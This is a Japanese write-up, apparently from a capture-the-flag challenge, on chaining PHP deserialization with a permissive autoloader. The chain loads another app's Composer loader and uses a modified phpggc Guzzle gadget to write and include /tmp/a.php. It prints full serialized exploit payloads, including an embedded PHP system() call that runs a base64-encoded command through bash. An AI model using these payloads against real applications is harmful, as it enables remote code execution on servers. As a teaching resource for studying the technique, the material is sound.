# PHP - デシリアライズ + オートロードクラス

{{#include ../../banners/hacktricks-training.md}}

まず、[**オートロードクラス**](https://www.php.net/manual/en/language.oop5.autoload.php)が何であるかを確認する必要があります。

## PHP デシリアライズ + spl_autoload_register + LFI/Gadget

私たちは、**`phpggc`** 内に脆弱なガジェットを持たない **ウェブアプリのPHPデシリアライズ** を見つけた状況にいます。しかし、同じコンテナ内には **脆弱なライブラリを持つ別のコンポーザーウェブアプリ** がありました。したがって、目標は **別のウェブアプリのコンポーザーローダーを読み込み**、それを悪用して **デシリアライズに脆弱なウェブアプリのガジェットを利用すること** でした。

手順：

- **デシリアライズ** を見つけ、現在のアプリコードには **ガジェットが存在しない**
- 次のような **`spl_autoload_register`** 関数を悪用して **`.php` 拡張子のローカルファイルを読み込む**
- そのために、クラス名が **`$name`** 内に入るデシリアライズを使用します。シリアライズされたオブジェクトのクラス名には **"/" や "."** を使用できませんが、**コード** は **アンダースコア** ("\_") を **スラッシュ** ("/") に **置き換えています**。したがって、`tmp_passwd` のようなクラス名は `/tmp/passwd.php` に変換され、コードはそれを読み込もうとします。\
**ガジェットの例** は次のようになります： **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
> [!TIP]
> **ファイルアップロード**があり、**`.php`拡張子**のファイルをアップロードできる場合、この機能を**直接悪用**して、すでにRCEを取得することができます。

私の場合、そのようなものはありませんでしたが、**同じコンテナ**内に**`phpggc`ガジェットに脆弱なライブラリ**を持つ別のComposerウェブページがありました。

- この別のライブラリを読み込むには、まず**その別のウェブアプリのComposerローダーを読み込む必要があります**（現在のアプリケーションのローダーでは、他のアプリケーションのライブラリにアクセスできません）。**アプリケーションのパスを知っていれば**、次のように非常に簡単に実現できます：**`O:28:"www_frontend_vendor_autoload":0:{}`**（私の場合、Composerローダーは`/www/frontend/vendor/autoload.php`にありました）
- これで、**他のアプリのComposerローダーを読み込む**ことができるので、**使用するための`phpgcc`** **ペイロードを生成する**時が来ました。私の場合、**`Guzzle/FW1`**を使用し、これにより**ファイルシステム内の任意のファイルを書き込む**ことができました。
- 注：**生成されたガジェットは機能しませんでした**。これが機能するためには、**`phpggc`のペイロード** **`chain.php`**を**修正**し、クラスの**すべての属性**を**privateからpublicに**設定しました。そうしないと、文字列をデシリアライズした後、作成されたオブジェクトの属性には値がありませんでした。
- これで、**他のアプリのComposerローダーを読み込む方法**があり、**機能するphpggcペイロード**も手に入れましたが、**ガジェットが使用されるときにローダーが読み込まれるように、同じリクエスト内でこれを行う必要があります**。そのため、次のように両方のオブジェクトを含むシリアライズされた配列を送信しました：
- **最初にローダーが読み込まれ、その後にペイロードが表示される**のがわかります。
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- さて、**ファイルを作成して書き込む**ことができますが、ユーザーは**ウェブサーバー内の任意のフォルダーに書き込むことができません**。したがって、ペイロードに見られるように、PHPが**`system`**を呼び出し、いくつかの**base64**が**`/tmp/a.php`**に作成されます。次に、**最初のタイプのペイロードを再利用**して、他のウェブアプリのコンポーザーローダーを読み込むために、生成された**`/tmp/a.php`**ファイルを読み込みます。それをデシリアライズガジェットに追加するだけです：
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
**ペイロードの概要**

- **異なるウェブアプリのcomposerオートロードを読み込む** 同じコンテナ内で
- **phpggcガジェットを読み込む** 他のウェブアプリのライブラリを悪用するために（デシリアライズに脆弱な最初のウェブアプリにはそのライブラリにガジェットがなかった）
- ガジェットは **/tmp/a.php にPHPペイロードを含むファイルを作成する** 悪意のあるコマンドを含む（ウェブアプリのユーザーはどのウェブアプリのフォルダにも書き込むことができない）
- ペイロードの最終部分は **生成されたPHPファイルを読み込む** それがコマンドを実行する

私は **このデシリアライズを二回呼び出す必要があった**。私のテストでは、最初の時に `/tmp/a.php` ファイルが作成されたが読み込まれず、二回目には正しく読み込まれた。

{{#include ../../banners/hacktricks-training.md}}
